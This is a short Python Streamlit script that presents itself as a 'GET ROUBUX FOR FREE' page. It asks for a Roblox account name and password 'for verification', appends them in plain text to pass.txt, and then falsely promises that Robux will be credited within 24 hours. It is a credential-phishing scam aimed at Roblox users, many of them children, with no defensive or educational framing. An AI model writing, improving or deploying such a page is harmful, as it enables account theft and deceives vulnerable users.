import streamlit as st

st.header("GET ROUBUX FOR FREE")
option = st.selectbox(
    "how many robux you wan't",
    ['5000', '8000', '10000', '16000']
)
uid = input("your roblox account: ")
password = input("Enter Password for verification: ")
button = st.button("sumbit")

if button:
    with open("pass.txt", "a") as file:
        file.write(f"UID: {uid}, Password: {password}\n")
    st.text("robux will be added in your account in 24hours ")
print("Credentials saved to pass.txt")
